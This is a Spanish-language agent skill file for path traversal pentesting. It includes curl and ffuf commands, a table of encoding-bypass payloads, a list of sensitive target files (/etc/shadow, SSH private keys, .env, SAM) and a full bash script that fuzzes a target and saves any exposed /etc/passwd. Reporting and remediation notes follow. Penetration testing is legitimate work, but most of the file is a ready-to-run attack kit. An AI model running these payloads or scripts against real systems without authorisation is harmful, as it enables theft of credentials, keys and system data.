---
name: path-traversal
description: >
  Usar esta skill siempre que el usuario quiera realizar pruebas de Path Traversal
  (también llamado Directory Traversal), incluyendo: detección de la vulnerabilidad,
  generación o selección de payloads de traversal, automatización de ataques con curl
  o ffuf, análisis de respuestas del servidor, identificación de archivos sensibles
  expuestos, y documentación de hallazgos para informes de pentest. Activar también
  cuando se mencionen: traversal de directorios, LFI (Local File Inclusion) vía path,
  escape de directorio raíz, acceso a /etc/passwd, rutas con "../", parámetros de
  fichero en URLs (page=, file=, path=, documento=, etc.), bypass de filtros de path,
  encoding de rutas (%2f, %252f, ..%2f), o fuzzing de rutas en auditorías web.
  Incluye payloads del repositorio hackingyseguridad/directoriotraversal.
---

# Skill: Path Traversal / Directory Traversal

## Descripción de la vulnerabilidad

Path Traversal (CWE-22, OWASP A01:2021) permite a un atacante acceder a archivos
y directorios **fuera del directorio raíz del servidor web**, manipulando parámetros
de URL o inputs que contienen rutas de ficheros.

**Condición de explotabilidad**: el servidor concatena input del usuario con una ruta
base sin sanitizar correctamente, p. ej.:

```
/var/www/html/uploads/ + ../../etc/passwd  →  /etc/passwd
```

**Severidad CVSS típica**: 7.5 – 9.8 (Critical) cuando expone ficheros del sistema.

---

## Workflow de ataque

### Fase 1 — Reconocimiento de parámetros vulnerables

Identificar endpoints que acepten rutas o nombres de fichero:

```
https://target.com/download?file=report.pdf
https://target.com/view?page=about
https://target.com/img?src=/images/logo.png
https://target.com/api/docs?document=manual.pdf
```

Parámetros más comunes a auditar: `file`, `page`, `path`, `doc`, `documento`,
`template`, `src`, `img`, `view`, `resource`, `include`, `load`, `read`.

### Fase 2 — Prueba básica

```bash
# Prueba directa con curl (--path-as-is preserva los ../ sin normalizar)
curl --path-as-is -k -v "http://IP:80/../../../../../etc/passwd"

# Con parámetro GET
curl -sk "http://IP/download?file=../../../../etc/passwd"

# Comprobar respuesta: si contiene "root:x:0:0" → VULNERABLE
```

### Fase 3 — Fuzzing con lista de payloads

Usar el wordlist del repositorio **hackingyseguridad/directoriotraversal**:

```bash
# Descargar wordlist
WORDLIST="https://raw.githubusercontent.com/hackingyseguridad/directoriotraversal/refs/heads/master/pathtraversal.txt"
curl -s "$WORDLIST" -o pathtraversal.txt

# Fuzzing con ffuf
ffuf -w pathtraversal.txt:FUZZ \
     -u "http://TARGET/download?file=FUZZ" \
     -mc 200 -fs 0 \
     -o resultados_traversal.json \
     -of json

# Fuzzing en path directo con curl en bucle (bash)
while IFS= read -r payload; do
  resp=$(curl --path-as-is -sk -o /dev/null -w "%{http_code}" \
         "http://TARGET${payload}")
  if [ "$resp" = "200" ]; then
    echo "[VULN] $payload"
  fi
done < pathtraversal.txt
```

### Fase 4 — Selección de payloads por tipo de bypass

Consultar la referencia → `references/payloads-catalog.md`

Categorías principales a probar en orden:

| Prioridad | Tipo | Ejemplo |
|-----------|------|---------|
| 1 | Básico Unix | `../../../../etc/passwd` |
| 2 | URL encoding simple (`%2f`) | `..%2f..%2fetc/passwd` |
| 3 | Double URL encoding (`%252f`) | `..%252f..%252fetc/passwd` |
| 4 | Encoding punto (`%2e`) | `%2e%2e/etc/passwd` |
| 5 | Backslash Windows | `..\..\..\etc/passwd` |
| 6 | Backslash URL-encoded (`%5c`) | `..%5c..%5cetc/passwd` |
| 7 | Unicode / IIS bypass (`%u2215`) | `..%u2215etc/passwd` |
| 8 | UTF-8 overlong (`%c0%af`) | `..%c0%af..%c0%afetc/passwd` |
| 9 | Buffer padding (AAAA.../) | `/AAAA.../../etc/passwd` |
| 10 | Triple dot (`...`) | `.../etc/passwd` |

### Fase 5 — Archivos objetivo por sistema operativo

**Linux / Unix:**
```
/etc/passwd          # Usuarios del sistema
/etc/shadow          # Hashes de contraseñas (requiere root)
/etc/hosts           # Resolución DNS local
/etc/hostname        # Nombre del host
/proc/self/environ   # Variables de entorno del proceso web
/proc/self/cmdline   # Comandos del proceso
/proc/net/tcp        # Conexiones de red activas
/var/log/apache2/access.log  # Logs Apache (útil para Log Poisoning)
/var/log/nginx/access.log    # Logs Nginx
/home/<user>/.ssh/id_rsa     # Claves SSH privadas
/home/<user>/.bash_history   # Historial de comandos
/var/www/html/config.php     # Configs de la app web
/var/www/html/.env            # Variables de entorno Laravel/Node
```

**Windows:**
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM    # Hashes de cuentas (requiere SYSTEM)
C:\inetpub\wwwroot\web.config     # Config IIS
C:\xampp\phpMyAdmin\config.inc.php
C:\Users\<user>\Desktop\...
```

### Fase 6 — Análisis de respuesta

```bash
# Indicadores de éxito
grep -E "root:x:|bin:x:|daemon:" respuesta.txt     # /etc/passwd
grep -E "127\.0\.0\.1|localhost" respuesta.txt       # /etc/hosts
grep -iE "password|secret|key|token" respuesta.txt   # Configs

# Filtrar falsos positivos: comparar tamaño de respuesta base vs respuesta con payload
curl -sk "http://TARGET/download?file=normal.pdf" | wc -c   # baseline
curl -sk "http://TARGET/download?file=../../../../etc/passwd" | wc -c
```

---

## Herramientas recomendadas

| Herramienta | Uso | Comando clave |
|-------------|-----|---------------|
| `curl` | Prueba manual rápida | `--path-as-is -k -v` |
| `ffuf` | Fuzzing masivo | `-w wordlist -u URL/FUZZ` |
| `burpsuite` | Intercepción y repetición | Intruder → Sniper |
| `nuclei` | Detección automática | `-t path-traversal/` |
| `dotdotpwn` | Fuzzer especializado | `dotdotpwn -m http -h TARGET` |
| `wfuzz` | Alternativa a ffuf | `wfuzz -w wordlist URL/FUZZ` |

---

## Scripts de automatización

### Script bash completo (Kali Linux)

```bash
#!/bin/bash
# path_traversal_tester.sh — Uso: ./path_traversal_tester.sh http://TARGET
# Requiere: curl, ffuf

TARGET="$1"
WORDLIST_URL="https://raw.githubusercontent.com/hackingyseguridad/directoriotraversal/refs/heads/master/pathtraversal.txt"
OUTPUT_DIR="./pt_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Descargando wordlist..."
curl -s "$WORDLIST_URL" -o "$OUTPUT_DIR/pathtraversal.txt"

echo "[*] Fase 1: Path directo en URL"
while IFS= read -r payload; do
  resp=$(curl --path-as-is -sk -o /tmp/pt_body.txt -w "%{http_code}:%{size_download}" \
         "${TARGET}${payload}" 2>/dev/null)
  code=$(echo "$resp" | cut -d: -f1)
  size=$(echo "$resp" | cut -d: -f2)
  if [ "$code" = "200" ] && [ "$size" -gt 100 ]; then
    if grep -qE "root:x:|bin:x:" /tmp/pt_body.txt 2>/dev/null; then
      echo "[CRITICAL] /etc/passwd expuesto: ${TARGET}${payload}"
      cp /tmp/pt_body.txt "$OUTPUT_DIR/passwd_$(echo "$payload" | md5sum | cut -c1-8).txt"
    fi
  fi
done < "$OUTPUT_DIR/pathtraversal.txt"

echo "[*] Fase 2: Fuzzing en parámetro ?file="
ffuf -w "$OUTPUT_DIR/pathtraversal.txt":FUZZ \
     -u "${TARGET}/download?file=FUZZ" \
     -mc 200 -fs 0 -t 50 -s \
     -o "$OUTPUT_DIR/ffuf_results.json" -of json 2>/dev/null

echo "[*] Resultados en: $OUTPUT_DIR"
```

### One-liner para prueba rápida

```bash
# Test rápido de /etc/passwd en endpoint ?file=
for d in 1 2 3 4 5 6 7 8; do
  p=$(python3 -c "print('../'*$d+'etc/passwd')")
  curl -sk "${TARGET}/endpoint?file=${p}" | grep -q "root:x:" && echo "VULN depth=$d: $p"
done
```

---

## Contexto para informes

Clasificación estándar para incluir en el informe de pentest:

- **CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **OWASP Top 10**: A01:2021 – Broken Access Control
- **CVSS v3.1 base**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High**
  (puede subir a Critical si permite escritura o code execution)

### Recomendaciones de remediación

1. Usar listas blancas de ficheros permitidos, nunca listas negras.
2. Canonicalizar la ruta con `realpath()` / `Path.resolve()` antes de usarla.
3. Verificar que la ruta resultante empiece por el directorio base permitido.
4. Ejecutar el servidor web con el mínimo privilegio (sin acceso a `/etc/shadow`).
5. Implementar un WAF con reglas anti-traversal.
6. En Java: usar `FileSystems.getDefault().getPath()` con validación.
7. En Python: usar `os.path.abspath()` + `startswith(base_dir)`.
8. En PHP: usar `realpath()` y `basename()` para inputs que referencian ficheros.

---

## Referencias

- Repositorio payloads: https://github.com/hackingyseguridad/directoriotraversal
- Wordlist completa: https://raw.githubusercontent.com/hackingyseguridad/directoriotraversal/refs/heads/master/pathtraversal.txt
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- PortSwigger Lab: https://portswigger.net/web-security/file-path-traversal

**Para catálogo detallado de payloads por categoría → `references/payloads-catalog.md`**
